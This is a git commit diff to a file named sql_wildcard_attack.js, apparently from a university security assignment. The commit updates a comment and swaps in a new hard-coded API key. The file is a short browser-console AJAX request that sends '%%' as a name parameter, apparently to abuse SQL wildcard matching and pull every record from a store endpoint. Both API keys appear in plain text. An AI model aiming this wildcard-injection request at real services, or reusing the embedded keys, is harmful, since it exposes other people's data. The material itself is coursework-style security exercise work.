4f71a75af4f4c5f3093405563971f8af8ce7ed21
xiandew <visiande1998@gmail.com>
2021-05-06 20:18:39 +1000

    Update one comment with regards to the API key expiration

--- sql_wildcard_attack.js
+++ sql_wildcard_attack.js
@@ -1,10 +1,10 @@
 // Login as xiandew
 
-// Run in browser console
+// Replace the old apikey if needed. Run in browser console
 $.ajax({
     url: "http://assignment-hermes.unimelb.life/api/store.php?name=%%",
     type: "get",
-    headers: { apikey: "7d302c13-a286-11eb-a547-0242ac110002" }
+    headers: { apikey: "3d26b1f7-ad5e-11eb-8d17-0242ac110002" }
 }).done((data) => {
     console.log(data)
 });
